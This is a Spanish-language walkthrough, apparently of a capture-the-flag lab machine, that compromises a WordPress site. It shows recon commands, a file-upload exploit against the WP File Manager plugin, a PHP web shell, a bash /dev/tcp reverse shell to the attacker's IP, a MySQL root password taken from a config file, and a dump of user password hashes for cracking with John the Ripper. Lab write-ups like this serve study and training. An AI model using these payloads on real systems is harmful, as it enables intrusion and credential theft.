#WordPress #RCE #ReverseShell #MySQL #BruteForce 
[[192.168.1.19 (Atacante)]]

--------

Hacemos un primer reconocimiento con [[NMAP]]
`nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 192.168.1.23 -oG allPorts`

Obtendremos los siguientes puertos:
```js
[*] IP Address: 192.168.1.23
[*] Open ports: 22,80
```

Hacemos un escaneo mas exhaustivo sobre estos dos puertos con [[NMAP]]
`nmap -p22,80 -sCV 192.168.1.23 -oN targeted`

Obtendremos la siguiente información de los puertos:
```js
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)
|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
```


### WEB

Con el servicio en el puerto 80 levantado, navegamos con Firefox a la IP y usamos [[WHATWEB]] para ver que contiene la web e información sobre esta:
`whatweb http://192.168.1.23/`

```python
http://192.168.1.23/ [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.1.23]
```


Haremos una enumeración de la web con la herramienta [[GOBUSTER]]
`gobuster dir -u http://192.168.1.23/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 20 -x html,php,txt`

Nos enumerara los siguientes directorios:
```js
/index.html
/blog
/javascript
```

Si navegamos a `/blog` vemos que es un WordPress tendremos que añadirlo en el `/etc/hosts`, ahora recargamos la web y se vera el contenido como es.

Volveremos a enumerar el  [[00.- WORDPRESS]], con la herramienta [[WPSCAN]]
`wpscan --url http://192.168.1.23/blog/ --enumerate u,vp --plugins-detection aggressive`

Descubriremos un usuario llamado `wp-admin`, también si usamos el API token de [[WPSCAN]] podremos enumerar posibles vulnerabilidades. `$WPTOKEN` es una variable en la ZSHRC con el API token de WPScan
`wpscan --url http://192.168.1.23/blog/ --enumerate u,vp --plugins-detection aggressive --api-token=$WPTOKEN`

Al usar el Token lo que nos otorga son vulnerabilidades que ha habido sobre esa versión o esos plugins pudiendo así facilitarnos a la hora de realizar la explotación en esta caso usaremos el siguiente POC que nos otorga:
`https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9`

No da un script de Python con el POC, así que lo descargamos con wget:
`wget https://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py`

Una vez descargado vemos en el código que llama a un archivo `.php` llamado `payload.php` lo creamos con el siguiente contenido que nos facilitara dar ordenes con el comando cmd:
```php
<?php
	echo"<pre>" . shell_exec($_REQUEST['cmd']) . "<pre>";
?>
```

Ahora una vez creado deberemos ejecutar el python:
`python3 2020-wp-file-manager-v67.py http://192.168.1.23/blog/`

Nos dará un código de estado 200 y nos indicara donde se encuentra el fichero que hemos creado, en este caso la siguiente:
`http://192.168.1.23/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php`

Al finalizar la URL podemos añadir `?cmd=<comando>` para ejecutar comandos en la cmd de la maquina victima.

Como tenemos ejecución remota de comandos `RCE` nos ponemos en nuestra maquina atacante en escucha en el puerto `443`
`nc -nlvp 443`

Y en la web nos lanzamos una reverse shell:
`bash -c "bash -i >%26 /dev/tcp/192.168.1.19/443 0<%261"`

Obtendremos una shell y hacemos le tratamiento de la TTY

Navegamos a `/home` y veremos los usuarios y en usuario `hagrid98` encontramos el primer horocrux(Flag)

Para acceder a la información del wordpres buscamos en la ruta `cat /etc/apache2/sites-enabled/wordpress.conf`, y este nos dirá en donde se encuentra alojado el wordpress, que es en:
`/usr/share/wordpress`

En el `wp-config.php` no encontramos ninguna contraseña pero vemos que este esta llamando a `/etc/wordpress/config-default.php` así que lo leemos para ver que contiene

Y encontramos las credenciales del usuario root de la base de datos del wordpress `root::mySecr3tPass`

Nos conectamos en la base de datos `mysql -uroot -p` y cuando nos pida la contraseña la introducimos, listaremos las bases de datos:
`show databases;` vemos que hay una llamada wordpress, navegamos a ella
`use wordpress;` vemos las tablas que contiene
`show tables;` vemos la tabla `wp_users` así que listamos su contenido
`describe wp_users;` y seleccionaremos todo los que hay dentro de esta tabla
`select * from wp_users;` nos mostrara los usuarios con sus contraseñas las cuales se pueden crakear por fuerza bruta, nos la copiamos en un fichero llamado `hash` para intentar crackearlo con fuerza bruta.

Usaremos la herramienta [[JOHN THE RIPPER]]
`john --wordlist=/usr/share/wordlists/rockyou.txt hash `






